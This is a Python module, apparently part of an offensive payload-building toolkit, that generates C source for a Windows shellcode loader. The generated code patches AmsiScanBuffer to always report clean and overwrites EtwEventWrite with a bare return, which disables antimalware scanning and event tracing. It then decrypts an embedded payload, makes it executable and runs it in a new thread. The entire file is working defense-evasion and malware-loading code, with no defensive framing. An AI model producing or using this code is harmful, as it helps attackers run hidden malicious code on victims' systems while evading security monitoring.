#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for in-process ETW/AMSI patching before shellcode execution."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder


class EtwAmsiPatchBuilder(InjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        patch_amsi: bool = True,
        patch_etw: bool = True,
    ) -> str:
        patch_calls = ""
        if patch_amsi:
            patch_calls += "    if (!patch_amsi()) return 1;\n"
        if patch_etw:
            patch_calls += "    if (!patch_etw()) return 1;\n"

        return f"""
{chr(10).join(self.headers())}

char* enc_payload = "{encoded_payload}";

static BOOL patch_bytes(PVOID addr, const unsigned char* patch, SIZE_T patch_len)
{{
    DWORD old = 0;
    if (!addr || !patch_len) return FALSE;
    if (!VirtualProtect(addr, patch_len, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(addr, patch, patch_len);
    VirtualProtect(addr, patch_len, old, &old);
    return TRUE;
}}

static BOOL patch_amsi(void)
{{
    HMODULE amsi = LoadLibraryA("amsi.dll");
    PVOID scan = NULL;
    /* xor eax, eax; ret — AmsiScanBuffer returns AMSI_RESULT_CLEAN */
    unsigned char amsi_patch[] = {{ 0x31, 0xC0, 0xC3 }};

    if (!amsi) return TRUE;
    scan = (PVOID)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scan) return FALSE;
    return patch_bytes(scan, amsi_patch, sizeof(amsi_patch));
}}

static BOOL patch_etw(void)
{{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID etw = NULL;
    unsigned char ret_only[] = {{ 0xC3 }};

    if (!ntdll) return FALSE;
    etw = (PVOID)GetProcAddress(ntdll, "EtwEventWrite");
    if (!etw) return FALSE;
    return patch_bytes(etw, ret_only, sizeof(ret_only));
}}

DWORD WINAPI run_shellcode(LPVOID param)
{{
    ((void(*)())param)();
    return 0;
}}

int main(void)
{{
{self.decode_preamble()}
{patch_calls}
{self.decrypt_block(key, iv)}
    DWORD old = 0;
    if (!VirtualProtect(shellcode_buf, payload_size, PAGE_EXECUTE_READ, &old)) return 1;

    {self.sleep_block()}

    HANDLE thread = CreateThread(NULL, 0, run_shellcode, shellcode_buf, 0, NULL);
    if (!thread) return 1;
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFree(shellcode_buf, 0, MEM_RELEASE);
    free(decoded);
    return 0;
}}
"""
